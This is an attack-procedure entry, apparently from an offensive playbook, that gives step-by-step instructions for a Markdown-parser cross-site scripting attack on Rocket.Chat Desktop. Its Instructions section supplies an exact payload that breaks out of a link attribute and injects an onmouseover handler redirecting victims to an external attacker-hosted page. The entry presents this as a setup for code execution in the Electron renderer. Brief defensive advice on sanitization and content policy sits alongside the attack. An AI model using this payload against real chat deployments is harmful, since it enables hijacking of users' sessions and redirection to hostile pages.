---
id: proc-rocket-chat-markdown-xss
tags:
  - xss
  - markdown
  - injection
type: procedure
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Electron
  - macOS
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:23:28.587Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Send-Malicious-Markdown-for-XSS

## Summary

This procedure crafts and sends a Markdown payload in Rocket.Chat Desktop that exploits the parser to inject JavaScript attributes into a rendered HTML link, setting up for XSS execution on user interaction.

## Description

The Markdown parser in Rocket.Chat Desktop mishandles combined link and inline code syntax, allowing attribute breakout. The payload generates invalid HTML that the browser interprets as executable JS, specifically an onmouseover event redirecting to an attacker page. This occurs in the Electron renderer process, enabling context escape.

## Requirements

1. Access to send messages in a Rocket.Chat channel.
2. Knowledge of the Markdown syntax quirks in the app's parser.
3. Attacker-hosted redirect page (e.g., HTTPS endpoint).

## Defense

Defensive measures and detection strategies:

- Sanitize Markdown input with strict parsers like marked.js with extensions disabled.
- Implement Content Security Policy (CSP) to block inline JS in Electron.
- Log and scan messages for suspicious patterns like nested quotes in links.

## Objectives

1. Inject executable HTML attributes via parser trickery.
2. Render a booby-trapped link in the chat UI.
3. Prepare for victim-triggered JS execution.

## Instructions

### Step 1: Compose Payload

**Context**: Build the Markdown string that combines link `[text](url)` with inline code `` `code` `` to escape attributes.

Use this exact payload:

```markdown
[ hax ](http://hax//onmouseover=location='https://maustin.net/hax/rocket/hack.html';"`hax`zzz)
```

> Explanation: The URL part injects `onmouseover=location='https://...';"` and the code block closes the tag improperly, leading to `<a href="http://hax//onmouseover=..."`hax`zzz">` rendering.

### Step 2: Send in Channel

**Context**: Paste and submit the payload as a chat message.

No command; use the app's message input field to send.

> Expected: Message renders as a link labeled "hax" without errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques

- None

## Commands Used

- None

## Tools Used

- None

## Tags

- [[xss]]
- [[markdown]]
- [[injection]]
